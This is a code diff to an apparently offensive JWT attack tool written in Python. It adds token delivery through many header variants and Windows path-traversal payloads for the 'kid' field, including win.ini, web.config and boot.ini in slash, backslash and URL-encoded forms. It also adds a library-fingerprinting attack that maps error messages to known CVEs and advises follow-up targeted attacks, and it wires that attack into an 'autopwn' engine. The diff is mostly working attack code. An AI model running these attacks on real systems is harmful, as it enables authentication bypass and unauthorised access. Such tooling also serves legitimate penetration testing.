@@ -698,6 +698,36 @@ def check_url(token, url=None):
         except Exception as e:
             print(Fore.RED + f"[!] Request error (cookie '{cookie_name}'): {e}")
 
+    # Delivery attempt 3: custom header variants (frameworks, API gateways, proxies)
+    HEADER_VARIANTS = [
+        ("Authorization",   f"JWT {token}"),
+        ("Authorization",   f"Token {token}"),
+        ("X-Auth-Token",    token),
+        ("X-Access-Token",  token),
+        ("X-JWT-Assertion", token),
+        ("X-Token",         token),
+        ("x-api-key",       token),
+        ("Api-Key",         token),
+    ]
+    for hdr_name, hdr_value in HEADER_VARIANTS:
+        label = f"{hdr_name}: {hdr_value[:40]}..."
+        print(Fore.CYAN + f"[+] Testing  {hdr_name}  ({method})...")
+        try:
+            resp = session.request(method, url, headers={hdr_name: hdr_value}, timeout=timeout)
+            print(Fore.CYAN + f"[→] HTTP {resp.status_code} {resp.reason}")
+            ok, reason = is_success(resp)
+            if ok:
+                print(Fore.GREEN + f"\n[+] ✅ TOKEN ACCEPTED via '{hdr_name}'!  Reason: {reason}")
+                print_response_details(resp)
+                print(Fore.GREEN + Style.BRIGHT + f"\n[*] Accepted JWT:\n{token}")
+                if CONFIG["findings"]:
+                    CONFIG["findings"][-1]["verified"]      = True
+                    CONFIG["findings"][-1]["verify_reason"] = reason
+                    CONFIG["findings"][-1]["delivery"]      = f"{hdr_name}"
+                return
+        except Exception as e:
+            print(Fore.RED + f"[!] Request error ('{hdr_name}'): {e}")
+
     print(Fore.RED + "\n[!] Token not accepted via any tested delivery method.")
 
 
@@ -1048,17 +1078,32 @@ def attack_kid_traversal(token, url=None):
     modified_payload = interactive_edit_dict("Token payload", decoded)
 
     devnull_paths = [
+        # ── Linux / macOS ─────────────────────────────────────────
         "/dev/null",
         "../dev/null",
         "../../dev/null",
         "../../../dev/null",
         "../../../../dev/null",
-        "/dev/null",
         "file:///dev/null",
         "../////dev/null",
         "%2e%2e/%2e%2e/%2e%2e/dev/null",
         "dev/null",
-        "./../../../dev/null"
+        "./../../../dev/null",
+        # ── Windows — forward-slash variants ──────────────────────
+        "C:/Windows/win.ini",
+        "../../../Windows/win.ini",
+        "../../../../Windows/win.ini",
+        "C:/inetpub/wwwroot/web.config",
+        "C:/boot.ini",
+        # ── Windows — backslash variants ──────────────────────────
+        "C:\\Windows\\win.ini",
+        "..\\..\\..\\Windows\\win.ini",
+        "..\\..\\..\\..\\Windows\\win.ini",
+        "C:\\inetpub\\wwwroot\\web.config",
+        # ── Windows — URL-encoded variants ────────────────────────
+        "C%3A%5CWindows%5Cwin.ini",
+        "..%5C..%5C..%5CWindows%5Cwin.ini",
+        "%2e%2e%5c%2e%2e%5c%2e%2e%5cWindows%5cwin.ini",
     ]
 
     for kid in devnull_paths:
@@ -1376,8 +1421,124 @@ def attack_es256_psychic_signature(token, url=None):
 
 
 # ──────────────────────────────────────────────────────────────
-#  AUTOPWN ENGINE
+#  ATTACK #12 — JWT LIBRARY FINGERPRINTING
 # ──────────────────────────────────────────────────────────────
+
+# Error signatures → (library name, version hint, known CVEs list)
+_LIB_SIGNATURES = [
+    # PyJWT
+    ("Not enough segments",            "PyJWT (Python)",          ["CVE-2022-29217 (alg confusion, <2.4.0)", "CVE-2015-9235 (alg:none, <1.0.0)"]),
+    ("Invalid header string",          "PyJWT (Python)",          ["CVE-2022-29217"]),
+    ("Invalid header padding",         "PyJWT (Python)",          ["CVE-2022-29217"]),
+    # jsonwebtoken (Node)
+    ("jwt malformed",                  "jsonwebtoken (Node.js)",   ["CVE-2022-23529 (<9.0.0 — secret injection)", "CVE-2015-9235 (alg:none)"]),
+    ("invalid token",                  "jsonwebtoken (Node.js)",   ["CVE-2022-23529", "CVE-2022-23540"]),
+    ("Unexpected token",               "jsonwebtoken (Node.js)",   ["CVE-2022-23529"]),
+    # jjwt (Java)
+    ("JWT strings must contain exactly 2 period", "jjwt (Java)", ["CVE-2019-17195 (key confusion, <0.11.1)"]),
+    ("Unable to read JSON value",      "jjwt (Java)",             ["CVE-2019-17195"]),
+    # go-jwt / golang-jwt
+    ("token contains an invalid number of segments", "golang-jwt / go-jwt (Go)", ["CVE-2020-26160 (kid path traversal, <3.2.1)"]),
+    ("token is malformed",             "golang-jwt / go-jwt (Go)", ["CVE-2020-26160"]),
+    # php-jwt (firebase/php-jwt)
+    ("Wrong number of segments",       "firebase/php-jwt (PHP)",  ["CVE-2021-46143 (invalid curve attack, <6.0.0)"]),
+    ("Syntax error",                   "firebase/php-jwt (PHP)",  ["CVE-2021-46143"]),
+    # auth0/java-jwt
+    ("The token was expected to have 3 parts", "auth0/java-jwt (Java)", ["CVE-2019-17195"]),
+    # ruby-jwt
+    ("Not enough or too many segments","ruby-jwt (Ruby)",          ["no critical public CVEs — keep lib updated"]),
+    # jose / panva
+    ("JWTMalformed",                   "jose (Node.js / browser)", ["no critical public CVEs — keep lib updated"]),
+]
+
+
+def fingerprint_jwt_library(token, url=None):
+    """
+    Send malformed tokens to the target to fingerprint the JWT library in use.
+    Match error message patterns in the HTTP response body to identify the library
+    and display known CVEs relevant to that version/library.
+    """
+    if not url:
+        if CONFIG.get("autopwn"):
+            print(Fore.YELLOW + "[AUTOPWN] No --url — skipping library fingerprint.")
+            return
+        url = input(Fore.YELLOW + "Enter URL endpoint for fingerprinting (receives the token): ").strip()
+        if not url:
+            print(Fore.RED + "No URL provided. Skipping.")
+            return
+
+    print(Fore.CYAN + "\n" + "═" * 64)
+    print(Fore.CYAN + "  🔬  JWT LIBRARY FINGERPRINTING")
+    print(Fore.CYAN + "═" * 64)
+
+    session = requests.Session()
+    if CONFIG["proxy"]:
+        session.proxies = {"http": CONFIG["proxy"], "https": CONFIG["proxy"]}
+    session.verify = CONFIG["ssl_verify"]
+    timeout = CONFIG["timeout"]
+
+    # Malformed probes: each triggers a different error code path in most libs
+    probes = [
+        "definitely.not.a.valid.jwt",          # extra segments
+        "eyJhbGciOiJIUzI1NiJ9.bad-payload.",   # bad payload encoding
+        "X.Y",                                  # too few segments
+        "X.Y.Z.W",                              # too many segments
+    ]
+
+    found_library = None
+    found_cves    = []
+
+    delivery_attempts = [
+        lambda tok: {"headers": {"Authorization": f"Bearer {tok}"}},
+        lambda tok: {"cookies": {"jwt": tok}},
+        lambda tok: {"headers": {"X-Auth-Token": tok}},
+    ]
+
+    print(Fore.CYAN + f"[*] Probing {url} with {len(probes)} malformed tokens × {len(delivery_attempts)} delivery methods...")
+
+    for probe in probes:
+        for delivery_fn in delivery_attempts:
+            kwargs = delivery_fn(probe)
+            try:
+                resp = session.get(url, timeout=timeout, **kwargs)
+                body = resp.text
+                for sig, lib_name, cves in _LIB_SIGNATURES:
+                    if sig.lower() in body.lower():
+                        found_library = lib_name
+                        found_cves    = cves
+                        break
+            except Exception:
+                continue
+            if found_library:
+                break
+        if found_library:
+            break
+
+    print()
+    if found_library:
+        print(Fore.GREEN + Style.BRIGHT + f"[✅] Library identified: {found_library}")
+        print(Fore.RED   + "    Known CVEs for this library:")
+        for cve in found_cves:
+            print(Fore.RED + f"      ✦  {cve}")
+        print(Fore.YELLOW + "\n[*] Recommendation: Run targeted attacks for the CVEs listed above.")
+        # Record as a finding
+        CONFIG["findings"].append({
+            "attack":        "Library Fingerprint",
+            "token":         probe,
+            "payload":       {},
+            "header":        {},
+            "verified":      True,
+            "verify_reason": f"Library identified: {found_library}",
+            "delivery":      "fingerprint probe",
+            "timestamp":     time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
+        })
+    else:
+        print(Fore.YELLOW + "[~] Could not fingerprint the library — error messages may be suppressed.")
+        print(Fore.YELLOW + "    Try --proxy to inspect responses manually in Burp Suite.")
+
+    print(Fore.CYAN + "═" * 64)
+
+
 
 def run_autopwn(token, url, wordlist=None):
     """Run all automatable attack vectors non-interactively and test each against URL."""
@@ -1406,6 +1567,7 @@ def run_autopwn(token, url, wordlist=None):
         ("KID SQL Injection",           attack_kid_sqli),
         ("KID SSRF",                    attack_kid_ssrf),
         ("ES256 Psychic Signature",     attack_es256_psychic_signature),
+        ("Library Fingerprint",         fingerprint_jwt_library),
     ]
     if wordlist:
         autopwn_attacks.append(
@@ -1492,6 +1654,7 @@ def main():
         "9":  ("Null Signature (Signature Stripping)",            attack_null_signature),
         "10": ("KID SQL Injection",                               attack_kid_sqli),
         "11": ("KID SSRF",                                        attack_kid_ssrf),
+        "12": ("JWT Library Fingerprinting",                      fingerprint_jwt_library),
     }
 
     print(Fore.CYAN + "[*] Choose an attack method:")
